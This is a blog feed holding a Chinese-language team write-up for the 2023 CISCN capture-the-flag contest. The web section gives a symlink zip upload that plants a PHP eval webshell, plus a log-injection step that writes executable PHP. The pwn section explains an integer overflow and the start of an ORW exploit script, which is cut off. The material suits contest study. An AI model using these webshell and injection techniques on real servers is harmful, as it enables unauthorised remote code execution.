<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>十二惊惶</title>
  
  <subtitle>犁牛之子骍且角，虽欲勿用，山川其舍诸</subtitle>
  <link href="https://shierjinghuang.github.io/atom.xml" rel="self"/>
  
  <link href="https://shierjinghuang.github.io/"/>
  <updated>2023-05-30T06:41:14.403Z</updated>
  <id>https://shierjinghuang.github.io/</id>
  
  <author>
    <name>十二惊惶</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2023年ciscn题解</title>
    <link href="https://shierjinghuang.github.io/2023/05/27/2023%E5%B9%B4ciscn%E9%A2%98%E8%A7%A3/"/>
    <id>https://shierjinghuang.github.io/2023/05/27/2023%E5%B9%B4ciscn%E9%A2%98%E8%A7%A3/</id>
    <published>2023-05-27T11:56:52.000Z</published>
    <updated>2023-05-30T06:41:14.403Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DebuGGerrr-战队WRITEUP"><a href="#DebuGGerrr-战队WRITEUP" class="headerlink" title="DebuGGerrr 战队WRITEUP"></a>DebuGGerrr 战队WRITEUP</h1><h2 id="一、战队信息"><a href="#一、战队信息" class="headerlink" title="一、战队信息"></a>一、战队信息</h2><p>战队名称： DebuGGerrr </p><p>战队排名：261</p><h2 id="二、解题情况"><a href="#二、解题情况" class="headerlink" title="二、解题情况"></a>二、解题情况</h2><p> <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230528173741.png">  </p><p>[TOC]</p><h2 id="三、解题过程"><a href="#三、解题过程" class="headerlink" title="三、解题过程"></a>三、解题过程</h2><h3 id="杂项："><a href="#杂项：" class="headerlink" title="杂项："></a>杂项：</h3><h4 id="签到卡："><a href="#签到卡：" class="headerlink" title="签到卡："></a>签到卡：</h4><p> 随便输入得到hint，关注公众号，得到他的提示，输入 print(open(‘/flag’).read())得到flag</p><h4 id="国粹："><a href="#国粹：" class="headerlink" title="国粹："></a>国粹：</h4><p>在最初的思路里是一位题目是一个形如E(x)=(ax+b)(modm)的类仿射密码</p><p>后面试着要不把这些画出来看下，在写了几串之后看到了flag….然后因为分工，两个人写点坐标的格式不一样，最终Python代码如下…..</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token comment">#读入文件</span>file_path <span class="token operator">=</span> <span class="token string">"data.txt"</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_table<span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> header<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token comment">#定义 x  y变量</span>x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment">#定义颜色变量</span>color <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">,</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">]</span>xx <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">]</span>yy <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token comment">#用for循环将文件中的值赋值给x，y</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>df<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    x<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>df<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    y<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>df<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>xx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    x<span class="token punctuation">.</span>append<span class="token punctuation">(</span>xx<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>yy<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#画图</span>plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> c<span class="token operator">=</span>color<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> edgecolors<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="https://shierjinghuang.github.io/2023/05/27/2023%E5%B9%B4ciscn%E9%A2%98%E8%A7%A3/Ciscn%20%E6%95%A3%E7%82%B9%E5%9B%BE.png" style="zoom:67%;" /><blockquote><p> flag{202305012359}</p></blockquote><h4 id="被加密的生产流量"><a href="#被加密的生产流量" class="headerlink" title="被加密的生产流量:"></a>被加密的生产流量:</h4><p>追踪流发现base编码</p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230527141401.png" style="zoom: 33%;" /><p>base32编码，解码得到flag</p><blockquote><p>flag{c1f_fi1g_1000}</p></blockquote><h4 id="pyshell"><a href="#pyshell" class="headerlink" title="pyshell:"></a>pyshell:</h4><p>本题为python的shell终端，拼接读取flag的字符串后用eval()进行执行，即可获得flag</p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230528145149.png" style="zoom: 67%;" /><blockquote><p>flag{2c9b76d6-8379-4dd8-a95a-a383420575f5}</p></blockquote><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="unzip："><a href="#unzip：" class="headerlink" title="unzip："></a>unzip：</h4><p>建立软连接实现，</p><p>参考博客：<code>https://forum.butian.net/share/906</code></p><p>先建立软连接</p><pre class="line-numbers language-none"><code class="language-none">ln -s &#x2F;var&#x2F;www&#x2F;html test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">zip --symlinks test.zip .&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>创建 test文件</p><pre class="line-numbers language-none"><code class="language-none">mkdir test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>cd 进去创建cmd.php</p><pre class="line-numbers language-none"><code class="language-none">vim cmd.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>往里面写入一句话木马</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>退回上级目录，压缩test文件夹</p><pre class="line-numbers language-none"><code class="language-none">zip -r test1.zip .&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>先上传test.zip 后上传test1.zip，然后直接蚁剑连上</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;eci-2ze4nvw7kl74qmeixz3h.cloudeci1.ichunqiu.com&#x2F;cmd.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>找到flag即可</p><h4 id="dumpit"><a href="#dumpit" class="headerlink" title="dumpit"></a>dumpit</h4><p>对/flag下所有提供的参数进行测试，发现提供的第二个参数可以到日志</p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230528145934.png" style="zoom:50%;" /><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230528150053.png" style="zoom:50%;" /><p>过滤了post和get，不能直接将木马写入参数中执行</p><p>这里采用echo重定向的方式，将待执行的命令写入到User-Agent中，并重定向到/app/log/a.php中</p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230528150351.png" style="zoom:50%;" /><p>访问/log/a.php发现可以成功执行</p><p>最后在env环境变量中找到flag</p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230528150515.png" style="zoom: 50%;" /><blockquote><p>flag{290a8dfa-4d33-4ae2-a781-ef17e464d0bc}</p></blockquote><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="Sign-in-passwd"><a href="#Sign-in-passwd" class="headerlink" title="Sign_in_passwd:"></a>Sign_in_passwd:</h4><p>是一道Base64换表题目，使用CyberChef的Base64转码功能，可以自定义Base64表格，输入需要转码的字符串，即可得flag ，题目给的表中有部分经过url编码，解码后便可以正常实现</p><h4 id="基于国密SM2算法的密钥密文分发"><a href="#基于国密SM2算法的密钥密文分发" class="headerlink" title="基于国密SM2算法的密钥密文分发:"></a>基于国密SM2算法的密钥密文分发:</h4><p>非预期解，在登录获取id并且发送完公钥后，通过quantum获取服务器端密钥的密文后，search查看发现服务器端存在密钥的明文，即quantumStringServer，发送该明文进行check获取flag。</p><p>​                                <a href="https://imgse.com/i/p9LeEZj"><img src="https://s1.ax1x.com/2023/05/27/p9LeEZj.png" alt="p9LeEZj.png" style="zoom: 50%;" />        </a>    </p><blockquote><p>flag{fe362b36-56e5-4b6c-a5cc-12d3e755ce0}</p></blockquote><h4 id="可信度量"><a href="#可信度量" class="headerlink" title="可信度量:"></a>可信度量:</h4><p>非预期解，通过命令全局搜索flag字符串。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">grep <span class="token operator">-</span>ra <span class="token string">"flag&#123;"</span> <span class="token operator">/</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![img](file:///C:\Users\86198\Documents\Tencent Files\1766871892\Image\C2C\OYUNA5G0`(OO)VX%3$@P947.png)</p><h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><h4 id="烧烤摊儿"><a href="#烧烤摊儿" class="headerlink" title="烧烤摊儿:"></a>烧烤摊儿:</h4><p>首先，分析vip函数，发现无符号整数存在整数溢出，因此考虑输入-1000000使余额溢出到大于100000。</p><p>![img](file:///C:\Users\86198\Documents\Tencent Files\1766871892\Image\C2C]I{EODH[FQ1S]6X$Y}L0N8Y.png)</p><p>之后买下该店后通过栈溢出劫持程序执行流，因为本题禁止了execve的系统调用，因此考虑orw读取flag。只需要控制栈溢出后分别执行open，read，write三个函数。</p><p>完整exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#io = process("./shaokao")</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>name_addr <span class="token operator">=</span> <span class="token number">0x4E60F0</span>open_addr <span class="token operator">=</span> <span class="token number">0x457C90</span>read_addr <span class="token operator">=</span> <span class="token 